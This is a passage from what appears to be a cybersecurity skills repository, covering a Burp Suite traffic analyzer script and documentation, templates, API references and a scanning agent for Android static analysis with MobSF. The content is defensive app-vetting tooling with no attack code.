                "description": f"Missing security headers: {', '.join(missing)}",
            })
        return header_coverage

    def analyze_authentication(self) -> list:
        """Analyze authentication patterns in traffic."""
        auth_findings = []

        for req in self.requests:
            body = req.get("request_body", "")

            # Check for credentials in URL parameters
            parsed = urlparse(req["url"])
            params = parse_qs(parsed.query)
            sensitive_params = [
                k for k in params
                if any(s in k.lower() for s in ["password", "token", "key", "secret", "auth"])
            ]
            if sensitive_params:
                auth_findings.append({
                    "url": req["url"],
                    "issue": "credentials_in_url",
                    "parameters": sensitive_params,
                })

            # Check for basic auth
            if "Authorization: Basic" in body:
                auth_findings.append({
                    "url": req["url"],
                    "issue": "basic_auth_used",
                })

        if auth_findings:
            self.findings.append({
                "type": "authentication_issues",
                "severity": "HIGH",
                "owasp_mobile": "M1",
                "count": len(auth_findings),
                "details": auth_findings[:10],
                "description": f"{len(auth_findings)} authentication-related issues found",
            })
        return auth_findings

    def analyze_api_surface(self) -> dict:
        """Map the API surface area from captured traffic."""
        endpoints = Counter()
        methods = Counter()
        hosts = Counter()

        for req in self.requests:
            parsed = urlparse(req["url"])
            path = re.sub(r"\d+", "{id}", parsed.path)
            endpoints[f"{req['method']} {path}"] += 1
            methods[req["method"]] += 1
            hosts[req["host"]] += 1

        return {
            "unique_endpoints": len(endpoints),
            "top_endpoints": endpoints.most_common(20),
            "methods": dict(methods),
            "hosts": dict(hosts),
        }

    def generate_report(self) -> dict:
        """Generate comprehensive traffic analysis report."""
        api_surface = self.analyze_api_surface()

        return {
            "analysis": {
                "source_file": self.xml_path,
                "date": datetime.now().isoformat(),
                "total_requests": len(self.requests),
                "tool": "Burp Suite Traffic Analyzer",
            },
            "api_surface": api_surface,
            "findings": self.findings,
            "summary": {
                "total_findings": len(self.findings),
                "by_severity": Counter(f["severity"] for f in self.findings),
            },
        }


def main():
    parser = argparse.ArgumentParser(
        description="Analyze Burp Suite XML exports for mobile security findings"
    )
    parser.add_argument("--burp-xml", required=True, help="Path to Burp Suite XML export")
    parser.add_argument("--output", default="traffic_analysis.json", help="Output report path")
    args = parser.parse_args()

    if not Path(args.burp_xml).exists():
        print(f"[-] File not found: {args.burp_xml}")
        sys.exit(1)

    analyzer = BurpTrafficAnalyzer(args.burp_xml)

    # Parse
    count = analyzer.parse_burp_xml()
    print(f"[+] Parsed {count} requests from Burp export")

    # Run analyses
    analyzer.analyze_cleartext_traffic()
    analyzer.analyze_sensitive_data()
    analyzer.analyze_security_headers()
    analyzer.analyze_authentication()

    # Generate report
    report = analyzer.generate_report()

    with open(args.output, "w") as f:
        json.dump(report, f, indent=2)
    print(f"[+] Report saved: {args.output}")
    print(f"[*] Total findings: {report['summary']['total_findings']}")


if __name__ == "__main__":
    main()

===== END FILE =====


===== FILE: skills/performing-android-app-static-analysis-with-mobsf/SKILL.md =====
---
name: performing-android-app-static-analysis-with-mobsf
description: 'Performs automated static analysis of Android applications using Mobile
  Security Framework (MobSF) to identify hardcoded secrets, insecure permissions,
  vulnerable components, weak cryptography, and code-level security flaws without
  executing the application. Use when assessing Android APK/AAB files for security
  vulnerabilities before deployment, during penetration testing, or as part of CI/CD
  security gates. Activates for requests involving Android static analysis, MobSF
  scanning, APK security assessment, or mobile application code review.

  '
domain: cybersecurity
subdomain: mobile-security
author: mahipal
tags:
- mobile-security
- android
- mobsf
- static-analysis
- owasp-mobile
- penetration-testing
version: 1.0.0
license: Apache-2.0
nist_csf:
- PR.PS-01
- PR.AA-05
- ID.RA-01
- DE.CM-09
mitre_attack:
- T1059
- T1056
- T1036
- T1078
---
# Performing Android App Static Analysis with MobSF

## When to Use

Use this skill when:
- Conducting security assessment of Android APK or AAB files before production release
- Integrating automated mobile security scanning into CI/CD pipelines
- Performing initial triage of Android applications during penetration testing engagements
- Reviewing third-party Android applications for supply chain security risks

**Do not use** this skill as a replacement for manual code review or dynamic analysis -- MobSF static analysis catches pattern-based vulnerabilities but misses runtime logic flaws.

## Prerequisites

- MobSF v4.x installed via Docker (`docker pull opensecurity/mobile-security-framework-mobsf`) or local setup
- Target Android APK, AAB, or source code ZIP
- Python 3.10+ for MobSF REST API integration
- JADX decompiler (bundled with MobSF) for Java/Kotlin source recovery
- Network access to MobSF web interface (default: http://localhost:8000)

## Workflow

### Step 1: Deploy MobSF and Obtain API Key

Launch MobSF using Docker for isolated, reproducible scanning:

```bash
docker run -it --rm -p 8000:8000 opensecurity/mobile-security-framework-mobsf:latest
```

Retrieve the REST API key from the MobSF web interface at `http://localhost:8000/api_docs` or from the startup console output. The API key enables programmatic scanning.

### Step 2: Upload APK for Static Analysis

Upload the target APK using the MobSF REST API:

```bash
curl -F "file=@target_app.apk" http://localhost:8000/api/v1/upload \
  -H "Authorization: <API_KEY>"
```

Response includes the `hash` identifier used for subsequent API calls. MobSF automatically decompiles the APK using JADX, extracts the AndroidManifest.xml, and indexes all resources.

### Step 3: Trigger and Retrieve Static Scan Results

Initiate the static scan and retrieve results:

```bash
# Trigger scan
curl -X POST http://localhost:8000/api/v1/scan \
  -H "Authorization: <API_KEY>" \
  -d "scan_type=apk&file_name=target_app.apk&hash=<FILE_HASH>"

# Retrieve JSON report
curl -X POST http://localhost:8000/api/v1/report_json \
  -H "Authorization: <API_KEY>" \
  -d "hash=<FILE_HASH>"
```

### Step 4: Analyze Critical Findings

MobSF static analysis covers these categories mapped to OWASP Mobile Top 10 2024:

**Manifest Analysis (M8 - Security Misconfiguration)**:
- Exported activities, services, receivers, and content providers without permission guards
- `android:debuggable="true"` left enabled
- `android:allowBackup="true"` enabling data extraction via ADB
- Missing `android:networkSecurityConfig` for certificate pinning

**Code Analysis (M1 - Improper Credential Usage)**:
- Hardcoded API keys, passwords, and tokens in Java/Kotlin source
- Insecure SharedPreferences usage for storing sensitive data
- Weak or broken cryptographic implementations (ECB mode, static IV, hardcoded keys)

**Network Security (M5 - Insecure Communication)**:
- Missing certificate pinning configuration
- Custom TrustManagers that accept all certificates
- Cleartext HTTP traffic allowed without exception domains

**Binary Analysis (M7 - Insufficient Binary Protections)**:
- Missing ProGuard/R8 obfuscation
- Native library vulnerabilities (stack canaries, NX bit, PIE)
- Debugger detection absence

### Step 5: Generate and Export Reports

Export findings in multiple formats for stakeholder communication:

```bash
# PDF report
curl -X POST http://localhost:8000/api/v1/download_pdf \
  -H "Authorization: <API_KEY>" \
  -d "hash=<FILE_HASH>" -o report.pdf

# JSON for programmatic processing
curl -X POST http://localhost:8000/api/v1/report_json \
  -H "Authorization: <API_KEY>" \
  -d "hash=<FILE_HASH>" -o report.json
```

### Step 6: Integrate into CI/CD Pipeline

Add MobSF scanning as a build gate:

```yaml
# GitHub Actions example
- name: MobSF Static Analysis
  run: |
    UPLOAD=$(curl -s -F "file=@app/build/outputs/apk/release/app-release.apk" \
      http://mobsf:8000/api/v1/upload -H "Authorization: $MOBSF_API_KEY")
    HASH=$(echo $UPLOAD | jq -r '.hash')
    curl -s -X POST http://mobsf:8000/api/v1/scan \
      -H "Authorization: $MOBSF_API_KEY" \
      -d "scan_type=apk&file_name=app-release.apk&hash=$HASH"
    SCORE=$(curl -s -X POST http://mobsf:8000/api/v1/scorecard \
      -H "Authorization: $MOBSF_API_KEY" -d "hash=$HASH" | jq '.security_score')
    if [ "$SCORE" -lt 60 ]; then exit 1; fi
```

## Key Concepts

| Term | Definition |
|------|-----------|
| **Static Analysis** | Examination of application code and resources without executing the program; catches structural and pattern-based vulnerabilities |
| **APK Decompilation** | Process of recovering Java/Kotlin source from compiled Dalvik bytecode using tools like JADX or apktool |
| **AndroidManifest.xml** | Configuration file declaring app components, permissions, and security attributes; primary target for manifest analysis |
| **Certificate Pinning** | Technique binding an app to specific server certificates to prevent man-in-the-middle attacks via rogue CAs |
| **ProGuard/R8** | Code obfuscation and shrinking tools that make reverse engineering more difficult by renaming classes and removing unused code |

## Tools & Systems

- **MobSF**: Automated mobile security analysis framework supporting static and dynamic analysis of Android/iOS apps
- **JADX**: Dex-to-Java decompiler for recovering readable source code from Android APK files
- **apktool**: Tool for reverse engineering Android APK files, decoding resources to near-original form
- **Android Lint**: Google's static analysis tool for Android-specific code quality and security issues
- **Semgrep**: Pattern-based static analysis engine with mobile-specific rule packs for custom vulnerability detection

## Common Pitfalls

- **Ignoring false positives**: MobSF flags patterns like `password` in variable names even when not storing actual credentials. Triage all HIGH findings manually before reporting.
- **Missing obfuscated code**: Static analysis accuracy drops significantly against obfuscated apps. Supplement with dynamic analysis for apps using DexGuard or custom packers.
- **Outdated MobSF rules**: Security rules evolve with Android API levels. Ensure MobSF is updated to match the target app's `targetSdkVersion`.
- **Skipping native code analysis**: MobSF analyzes Java/Kotlin but has limited coverage of native C/C++ libraries. Use `checksec` and manual review for `.so` files.

===== END FILE =====


===== FILE: skills/performing-android-app-static-analysis-with-mobsf/LICENSE =====

                                 Apache License
                           Version 2.0, January 2004
                        http://www.apache.org/licenses/

   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION

   1. Definitions.

      "License" shall mean the terms and conditions for use, reproduction,
      and distribution as defined by Sections 1 through 9 of this document.

      "Licensor" shall mean the copyright owner or entity authorized by
      the copyright owner that is granting the License.

      "Legal Entity" shall mean the union of the acting entity and all
      other entities that control, are controlled by, or are under common
      control with that entity. For the purposes of this definition,
      "control" means (i) the power, direct or indirect, to cause the
      direction or management of such entity, whether by contract or
      otherwise, or (ii) ownership of fifty percent (50%) or more of the
      outstanding shares, or (iii) beneficial ownership of such entity.

      "You" (or "Your") shall mean an individual or Legal Entity
      exercising permissions granted by this License.

      "Source" form shall mean the preferred form for making modifications,
      including but not limited to software source code, documentation
      source, and configuration files.

      "Object" form shall mean any form resulting from mechanical
      transformation or translation of a Source form, including but
      not limited to compiled object code, generated documentation,
      and conversions to other media types.

      "Work" shall mean the work of authorship, whether in Source or
      Object form, made available under the License, as indicated by a
      copyright notice that is included in or attached to the work
      (an example is provided in the Appendix below).

      "Derivative Works" shall mean any work, whether in Source or Object
      form, that is based on (or derived from) the Work and for which the
      editorial revisions, annotations, elaborations, or other modifications
      represent, as a whole, an original work of authorship. For the purposes
      of this License, Derivative Works shall not include works that remain
      separable from, or merely link (or bind by name) to the interfaces of,
      the Work and Derivative Works thereof.

      "Contribution" shall mean any work of authorship, including
      the original version of the Work and any modifications or additions
      to that Work or Derivative Works thereof, that is intentionally
      submitted to the Licensor for inclusion in the Work by the copyright owner
      or by an individual or Legal Entity authorized to submit on behalf of
      the copyright owner. For the purposes of this definition, "submitted"
      means any form of electronic, verbal, or written communication sent
      to the Licensor or its representatives, including but not limited to
      communication on electronic mailing lists, source code control systems,
      and issue tracking systems that are managed by, or on behalf of, the
      Licensor for the purpose of discussing and improving the Work, but
      excluding communication that is conspicuously marked or otherwise
      designated in writing by the copyright owner as "Not a Contribution."

      "Contributor" shall mean Licensor and any individual or Legal Entity
      on behalf of whom a Contribution has been received by the Licensor and
      subsequently incorporated within the Work.

   2. Grant of Copyright License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      copyright license to reproduce, prepare Derivative Works of,
      publicly display, publicly perform, sublicense, and distribute the
      Work and such Derivative Works in Source or Object form.

   3. Grant of Patent License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      (except as stated in this section) patent license to make, have made,
      use, offer to sell, sell, import, and otherwise transfer the Work,
      where such license applies only to those patent claims licensable
      by such Contributor that are necessarily infringed by their
      Contribution(s) alone or by combination of their Contribution(s)
      with the Work to which such Contribution(s) was submitted. If You
      institute patent litigation against any entity (including a
      cross-claim or counterclaim in a lawsuit) alleging that the Work
      or a Contribution incorporated within the Work constitutes direct
      or contributory patent infringement, then any patent licenses
      granted to You under this License for that Work shall terminate
      as of the date such litigation is filed.

   4. Redistribution. You may reproduce and distribute copies of the
      Work or Derivative Works thereof in any medium, with or without
      modifications, and in Source or Object form, provided that You
      meet the following conditions:

      (a) You must give any other recipients of the Work or
          Derivative Works a copy of this License; and

      (b) You must cause any modified files to carry prominent notices
          stating that You changed the files; and

      (c) You must retain, in the Source form of any Derivative Works
          that You distribute, all copyright, patent, trademark, and
          attribution notices from the Source form of the Work,
          excluding those notices that do not pertain to any part of
          the Derivative Works; and

      (d) If the Work includes a "NOTICE" text file as part of its
          distribution, then any Derivative Works that You distribute must
          include a readable copy of the attribution notices contained
          within such NOTICE file, excluding any notices that do not
          pertain to any part of the Derivative Works, in at least one
          of the following places: within a NOTICE text file distributed
          as part of the Derivative Works; within the Source form or
          documentation, if provided along with the Derivative Works; or,
          within a display generated by the Derivative Works, if and
          wherever such third-party notices normally appear. The contents
          of the NOTICE file are for informational purposes only and
          do not modify the License. You may add Your own attribution
          notices within Derivative Works that You distribute, alongside
          or as an addendum to the NOTICE text from the Work, provided
          that such additional attribution notices cannot be construed
          as modifying the License.

      You may add Your own copyright statement to Your modifications and
      may provide additional or different license terms and conditions
      for use, reproduction, or distribution of Your modifications, or
      for any such Derivative Works as a whole, provided Your use,
      reproduction, and distribution of the Work otherwise complies with
      the conditions stated in this License.

   5. Submission of Contributions. Unless You explicitly state otherwise,
      any Contribution intentionally submitted for inclusion in the Work
      by You to the Licensor shall be under the terms and conditions of
      this License, without any additional terms or conditions.
      Notwithstanding the above, nothing herein shall supersede or modify
      the terms of any separate license agreement you may have executed
      with Licensor regarding such Contributions.

   6. Trademarks. This License does not grant permission to use the trade
      names, trademarks, service marks, or product names of the Licensor,
      except as required for reasonable and customary use in describing the
      origin of the Work and reproducing the content of the NOTICE file.

   7. Disclaimer of Warranty. Unless required by applicable law or
      agreed to in writing, Licensor provides the Work (and each
      Contributor provides its Contributions) on an "AS IS" BASIS,
      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
      implied, including, without limitation, any warranties or conditions
      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A
      PARTICULAR PURPOSE. You are solely responsible for determining the
      appropriateness of using or redistributing the Work and assume any
      risks associated with Your exercise of permissions under this License.

   8. Limitation of Liability. In no event and under no legal theory,
      whether in tort (including negligence), contract, or otherwise,
      unless required by applicable law (such as deliberate and grossly
      negligent acts) or agreed to in writing, shall any Contributor be
      liable to You for damages, including any direct, indirect, special,
      incidental, or consequential damages of any character arising as a
      result of this License or out of the use or inability to use the
      Work (including but not limited to damages for loss of goodwill,
      work stoppage, computer failure or malfunction, or any and all
      other commercial damages or losses), even if such Contributor
      has been advised of the possibility of such damages.

   9. Accepting Warranty or Additional Liability. While redistributing
      the Work or Derivative Works thereof, You may choose to offer,
      and charge a fee for, acceptance of support, warranty, indemnity,
      or other liability obligations and/or rights consistent with this
      License. However, in accepting such obligations, You may act only
      on Your own behalf and on Your sole responsibility, not on behalf
      of any other Contributor, and only if You agree to indemnify,
      defend, and hold each Contributor harmless for any liability
      incurred by, or claims asserted against, such Contributor by reason
      of your accepting any such warranty or additional liability.

   END OF TERMS AND CONDITIONS

   APPENDIX: How to apply the Apache License to your work.

      To apply the Apache License to your work, attach the following
      boilerplate notice, with the fields enclosed by brackets "[]"
      replaced with your own identifying information. (Don't include
      the brackets!)  The text should be enclosed in the appropriate
      comment syntax for the file format. Please do not remove or change
      the license header comment from a contributed file except when
      necessary.

   Copyright 2026 mukul975

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

===== END FILE =====


===== FILE: skills/performing-android-app-static-analysis-with-mobsf/assets/template.md =====
# MobSF Static Analysis Report Template

## Engagement Information

| Field | Value |
|-------|-------|
| Application Name | [APP_NAME] |
| Package Name | [PACKAGE_NAME] |
| Version | [VERSION] |
| Target SDK | [TARGET_SDK] |
| Min SDK | [MIN_SDK] |
| File Hash (SHA256) | [HASH] |
| Analysis Date | [DATE] |
| Analyst | [ANALYST] |
| MobSF Version | [MOBSF_VERSION] |

## Executive Summary

**Security Score**: [SCORE]/100

**Overall Risk Rating**: [HIGH/MEDIUM/LOW]

[Brief narrative of key findings and overall security posture]

## Findings Summary

| Severity | Count | Categories |
|----------|-------|------------|
| Critical | [N] | [Categories] |
| High | [N] | [Categories] |
| Medium | [N] | [Categories] |
| Low | [N] | [Categories] |
| Info | [N] | [Categories] |

## Manifest Analysis

### Exported Components

| Component Type | Name | Permission Guard | Risk |
|---------------|------|-------------------|------|
| Activity | [NAME] | [PERMISSION/None] | [RISK] |
| Service | [NAME] | [PERMISSION/None] | [RISK] |
| Receiver | [NAME] | [PERMISSION/None] | [RISK] |
| Provider | [NAME] | [PERMISSION/None] | [RISK] |

### Permissions Requested

| Permission | Protection Level | Justification | Risk |
|-----------|-----------------|---------------|------|
| [PERMISSION] | [dangerous/normal/signature] | [JUSTIFICATION] | [RISK] |

### Manifest Flags

| Flag | Value | Expected | Status |
|------|-------|----------|--------|
| android:debuggable | [VALUE] | false | [PASS/FAIL] |
| android:allowBackup | [VALUE] | false | [PASS/FAIL] |
| android:usesCleartextTraffic | [VALUE] | false | [PASS/FAIL] |

## Code Analysis Findings

### Finding [N]: [TITLE]

- **Severity**: [CRITICAL/HIGH/MEDIUM/LOW]
- **CWE**: [CWE-ID]
- **OWASP Mobile**: [M1-M10]
- **MASVS**: [MASVS-CATEGORY]
- **Description**: [DESCRIPTION]
- **Affected Files**:
  - [FILE_PATH:LINE_NUMBER]
- **Evidence**: [CODE_SNIPPET]
- **Recommendation**: [REMEDIATION_STEPS]

## Network Security Analysis

| Check | Result | Details |
|-------|--------|---------|
| Certificate Pinning | [Present/Absent] | [DETAILS] |
| Network Security Config | [Present/Absent] | [DETAILS] |
| Cleartext Traffic | [Allowed/Blocked] | [DETAILS] |
| TLS Version | [VERSION] | [DETAILS] |

## Binary Analysis

| Check | Result | Details |
|-------|--------|---------|
| Code Obfuscation | [Yes/No] | [DETAILS] |
| Root Detection | [Present/Absent] | [DETAILS] |
| Debug Detection | [Present/Absent] | [DETAILS] |
| Emulator Detection | [Present/Absent] | [DETAILS] |
| Native Libraries (NX) | [Enabled/Disabled] | [DETAILS] |
| Native Libraries (PIE) | [Enabled/Disabled] | [DETAILS] |
| Native Libraries (Stack Canary) | [Present/Absent] | [DETAILS] |

## Recommendations

### Critical (Immediate Action Required)

1. [RECOMMENDATION]

### High (Fix Before Release)

1. [RECOMMENDATION]

### Medium (Address in Next Sprint)

1. [RECOMMENDATION]

### Low (Track in Backlog)

1. [RECOMMENDATION]

## OWASP Mobile Top 10 2024 Compliance

| ID | Risk | Status | Findings |
|----|------|--------|----------|
| M1 | Improper Credential Usage | [PASS/FAIL] | [DETAILS] |
| M2 | Inadequate Supply Chain Security | [PASS/FAIL] | [DETAILS] |
| M3 | Insecure Authentication/Authorization | [PASS/FAIL] | [DETAILS] |
| M4 | Insufficient Input/Output Validation | [PASS/FAIL] | [DETAILS] |
| M5 | Insecure Communication | [PASS/FAIL] | [DETAILS] |
| M6 | Inadequate Privacy Controls | [PASS/FAIL] | [DETAILS] |
| M7 | Insufficient Binary Protections | [PASS/FAIL] | [DETAILS] |
| M8 | Security Misconfiguration | [PASS/FAIL] | [DETAILS] |
| M9 | Insecure Data Storage | [PASS/FAIL] | [DETAILS] |
| M10 | Insufficient Cryptography | [PASS/FAIL] | [DETAILS] |

===== END FILE =====


===== FILE: skills/performing-android-app-static-analysis-with-mobsf/references/api-reference.md =====
# API Reference: MobSF Android Static Analysis

## Libraries Used

| Library | Purpose |
|---------|---------|
| `requests` | HTTP client for MobSF REST API v1 |
| `json` | Parse scan reports and finding data |
| `os` | Read `MOBSF_URL` and `MOBSF_API_KEY` environment variables |

## Installation

```bash
pip install requests

# MobSF server (Docker)
docker pull opensecurity/mobile-security-framework-mobsf
docker run -it -p 8000:8000 opensecurity/mobile-security-framework-mobsf
```

## Authentication

MobSF uses API key authentication. The default key is shown on the MobSF dashboard:

```python
import requests
import os

MOBSF_URL = os.environ.get("MOBSF_URL", "http://localhost:8000")
MOBSF_KEY = os.environ["MOBSF_API_KEY"]
headers = {"Authorization": MOBSF_KEY}
```

## REST API v1 Endpoints

| Method | Endpoint | Description |
|--------|----------|-------------|
| POST | `/api/v1/upload` | Upload APK, IPA, ZIP, or APPX for analysis |
| POST | `/api/v1/scan` | Trigger static analysis on uploaded file |
| GET | `/api/v1/report_json` | Get full JSON analysis report |
| POST | `/api/v1/download_pdf` | Download PDF report |
| GET | `/api/v1/scans` | List recent scans |
| POST | `/api/v1/delete_scan` | Delete a scan and its data |
| POST | `/api/v1/search` | Search scans by hash or filename |
| POST | `/api/v1/compare` | Compare two app scans |
| GET | `/api/v1/scorecard` | Get app security scorecard |
| GET | `/api/v1/scan_logs` | View live scan logs |

## Core Operations

### Upload an APK
```python
def upload_apk(file_path):
    with open(file_path, "rb") as f:
        resp = requests.post(
            f"{MOBSF_URL}/api/v1/upload",
            files={"file": (os.path.basename(file_path), f, "application/octet-stream")},
            headers=headers,
            timeout=120,
        )
    resp.raise_for_status()
    result = resp.json()
    return result["hash"], result["scan_type"], result["file_name"]
    # hash: SHA-256 of the uploaded file
    # scan_type: "apk", "ipa", "zip", "appx"
```

### Trigger Static Analysis
```python
def start_scan(file_hash, scan_type, file_name):
    resp = requests.post(
        f"{MOBSF_URL}/api/v1/scan",
        data={
            "hash": file_hash,
            "scan_type": scan_type,
            "file_name": file_name,
        },
        headers=headers,
        timeout=600,  # Scans can take several minutes
    )
    resp.raise_for_status()
    return resp.json()
```

### Retrieve JSON Report
```python
def get_report(file_hash):
    resp = requests.post(
        f"{MOBSF_URL}/api/v1/report_json",
        data={"hash": file_hash},
        headers=headers,
        timeout=60,
    )
    resp.raise_for_status()
    return resp.json()
```

### Extract Key Findings
```python
def extract_findings(report):
    findings = {
        "security_score": report.get("security_score", "N/A"),
        "app_name": report.get("app_name"),
        "package_name": report.get("package_name"),
        "target_sdk": report.get("target_sdk"),
        "min_sdk": report.get("min_sdk"),
        "permissions": {
            "dangerous": [],
            "normal": [],
        },
        "manifest_issues": [],
        "code_issues": [],
        "binary_issues": [],
    }

    # Dangerous permissions
    for perm, details in report.get("permissions", {}).items():
        status = details.get("status", "normal")
        if status == "dangerous":
            findings["permissions"]["dangerous"].append(perm)
        else:
            findings["permissions"]["normal"].append(perm)

    # Manifest analysis
    for issue in report.get("manifest_analysis", []):
        if issue.get("severity") in ("high", "warning"):
            findings["manifest_issues"].append({
                "title": issue["title"],
                "severity": issue["severity"],
                "description": issue["description"],
            })

    # Code analysis
    for issue_key, issue_data in report.get("code_analysis", {}).items():
        findings["code_issues"].append({
            "rule": issue_key,
            "severity": issue_data.get("level"),
            "description": issue_data.get("description"),
            "files": issue_data.get("path", [])[:5],
        })

    return findings
```

### Download PDF Report
```python
def download_pdf(file_hash, output_path):
    resp = requests.post(
        f"{MOBSF_URL}/api/v1/download_pdf",
        data={"hash": file_hash},
        headers=headers,
        timeout=120,
    )
    resp.raise_for_status()
    with open(output_path, "wb") as f:
        f.write(resp.content)
```

### Compare Two Applications
```python
resp = requests.post(
    f"{MOBSF_URL}/api/v1/compare",
    data={"hash1": hash_v1, "hash2": hash_v2},
    headers=headers,
    timeout=120,
)
comparison = resp.json()
# Shows permission changes, new vulnerabilities, code changes
```

## Output Format

```json
{
  "file_name": "app-debug.apk",
  "app_name": "TestApp",
  "package_name": "com.example.testapp",
  "security_score": 42,
  "target_sdk": "33",
  "min_sdk": "24",
  "permissions": {
    "android.permission.INTERNET": {"status": "normal", "description": "..."},
    "android.permission.READ_CONTACTS": {"status": "dangerous", "description": "..."}
  },
  "manifest_analysis": [
    {"title": "Application is debuggable", "severity": "high", "description": "..."}
  ],
  "code_analysis": {
    "android_insecure_random": {
      "level": "high",
      "description": "Insecure Random Number Generator",
      "path": ["com/example/CryptoUtils.java"]
    }
  },
  "binary_analysis": [
    {"title": "NX bit not set", "severity": "high"}
  ]
}
```

===== END FILE =====


===== FILE: skills/performing-android-app-static-analysis-with-mobsf/references/standards.md =====
# Standards Reference: Android Static Analysis with MobSF

## OWASP Mobile Top 10 2024 Mapping

| OWASP ID | Risk | MobSF Coverage |
|----------|------|----------------|
| M1 | Improper Credential Usage | Detects hardcoded API keys, passwords, tokens in source code and resources |
| M2 | Inadequate Supply Chain Security | Identifies third-party library versions with known CVEs |
| M5 | Insecure Communication | Flags missing certificate pinning, cleartext traffic, weak TLS |
| M7 | Insufficient Binary Protections | Checks ProGuard/R8 obfuscation, native binary protections |
| M8 | Security Misconfiguration | Analyzes AndroidManifest.xml for exported components, debug flags, backup settings |
| M9 | Insecure Data Storage | Detects SharedPreferences misuse, world-readable files, SQLite without encryption |
| M10 | Insufficient Cryptography | Identifies ECB mode, static IV, hardcoded encryption keys, weak algorithms |

## OWASP MASVS v2.0 Control Mapping

| MASVS Category | Controls | MobSF Static Checks |
|----------------|----------|---------------------|
| MASVS-STORAGE | Sensitive data storage | SharedPreferences analysis, file permission checks, database encryption |
| MASVS-CRYPTO | Cryptographic implementations | Algorithm strength, key management, IV randomness |
| MASVS-AUTH | Authentication mechanisms | Credential storage, biometric implementation review |
| MASVS-NETWORK | Network security | Network security config, certificate pinning, cleartext detection |
| MASVS-PLATFORM | Platform interaction | Intent filter analysis, content provider security, WebView configuration |
| MASVS-CODE | Code quality | Code obfuscation, debug symbols, error handling |
| MASVS-RESILIENCE | Reverse engineering resistance | Root detection, tamper detection, debugger detection |

## NIST SP 800-163 Rev 1: Vetting the Security of Mobile Applications

- Section 4.1: Static analysis as mandatory step in mobile app vetting process
- Section 4.2: Automated tools should check for known vulnerability patterns
- Section 5: Integration of vetting into enterprise mobile device management

## CWE Mappings for Common MobSF Findings

| CWE ID | Title | MobSF Finding Category |
|--------|-------|----------------------|
| CWE-312 | Cleartext Storage of Sensitive Information | Hardcoded credentials in source |
| CWE-319 | Cleartext Transmission of Sensitive Information | Missing HTTPS enforcement |
| CWE-327 | Use of Broken Cryptographic Algorithm | Weak crypto detection |
| CWE-330 | Use of Insufficiently Random Values | Static IV, predictable random |
| CWE-532 | Insertion of Sensitive Information into Log File | Logging sensitive data |
| CWE-749 | Exposed Dangerous Method or Function | Exported components without guards |
| CWE-919 | Weaknesses in Mobile Applications | General mobile-specific checks |
| CWE-925 | Improper Verification of Intent by Broadcast Receiver | Unprotected broadcast receivers |

===== END FILE =====


===== FILE: skills/performing-android-app-static-analysis-with-mobsf/references/workflows.md =====
# Workflows: Android Static Analysis with MobSF

## Workflow 1: Standalone APK Assessment

```
[Obtain APK] --> [Deploy MobSF Docker] --> [Upload via API] --> [Run Static Scan]
     |                                                               |
     v                                                               v
[Verify APK integrity]                                    [Review Manifest Analysis]
[Check signing certificate]                               [Review Code Analysis]
                                                          [Review Binary Analysis]
                                                          [Review Network Analysis]
                                                                     |
                                                                     v
                                                          [Triage HIGH/CRITICAL findings]
                                                          [Validate false positives]
                                                          [Generate PDF report]
```

## Workflow 2: CI/CD Pipeline Integration

```
[Developer pushes code] --> [Build APK] --> [Upload to MobSF] --> [Static Scan]
                                                                      |
                                                          +-----------+-----------+
                                                          |                       |
                                                   [Score >= 60]           [Score < 60]
                                                          |                       |
                                                   [Pass gate]            [Fail build]
                                                   [Archive report]       [Notify developer]
                                                   [Continue pipeline]    [Block deployment]
```

## Workflow 3: Third-Party App Vetting

```
[Receive third-party APK] --> [MobSF Static Scan] --> [Automated scoring]
                                                            |
                                                            v
                                                    [Manual review of:]
                                                    - Excessive permissions
                                                    - Data exfiltration indicators
                                                    - Known malware signatures
                                                    - C2 communication patterns
                                                            |
                                                            v
                                                    [Risk assessment report]
                                                    [Approve/Reject for enterprise use]
```

## Workflow 4: Comparative Analysis Across Versions

```
[APK v1.0] --> [MobSF Scan] --> [Baseline report]
                                       |
[APK v2.0] --> [MobSF Scan] --> [Compare findings] --> [New vulnerabilities introduced?]
                                       |                        |
                                       v                 [Yes: Block release]
                                [Regression report]      [No: Approve release]
```

## Decision Matrix: When to Escalate

| Finding Severity | MobSF Category | Action |
|-----------------|----------------|--------|
| CRITICAL | Hardcoded production API keys | Immediate key rotation, block release |
| HIGH | Exported activity with sensitive data | Manual verification, fix before release |
| MEDIUM | Missing certificate pinning | Add to sprint backlog, risk acceptance if internal app |
| LOW | Debug logging of non-sensitive data | Track in issue tracker, fix in next release |
| INFO | Missing ProGuard rules | Recommend but do not block |

===== END FILE =====


===== FILE: skills/performing-android-app-static-analysis-with-mobsf/scripts/agent.py =====
#!/usr/bin/env python3
"""MobSF Android static analysis agent.

Automates APK upload, static analysis scanning, and report retrieval
via the MobSF REST API. Extracts security findings including manifest
analysis, code analysis, binary analysis, and certificate checks.
"""
import argparse
import json
import os
import sys
import time
from datetime import datetime, timezone

try:
    import requests
except ImportError:
    print("[!] 'requests' library required: pip install requests", file=sys.stderr)
    sys.exit(1)


def get_mobsf_config():
    """Return MobSF server URL and API key from env or defaults."""
    server = os.environ.get("MOBSF_URL", "http://localhost:8000")
    api_key = os.environ.get("MOBSF_API_KEY", "")
    if not api_key:
        print("[!] Set MOBSF_API_KEY environment variable", file=sys.stderr)
        sys.exit(1)
    return server.rstrip("/"), api_key


def upload_apk(server, api_key, apk_path):
    """Upload an APK file to MobSF and return the file hash."""
    url = f"{server}/api/v1/upload"
    headers = {"Authorization": api_key}
    if not os.path.isfile(apk_path):
        print(f"[!] File not found: {apk_path}", file=sys.stderr)
        sys.exit(1)
    print(f"[*] Uploading {os.path.basename(apk_path)} to MobSF...")
    with open(apk_path, "rb") as f:
        resp = requests.post(
            url,
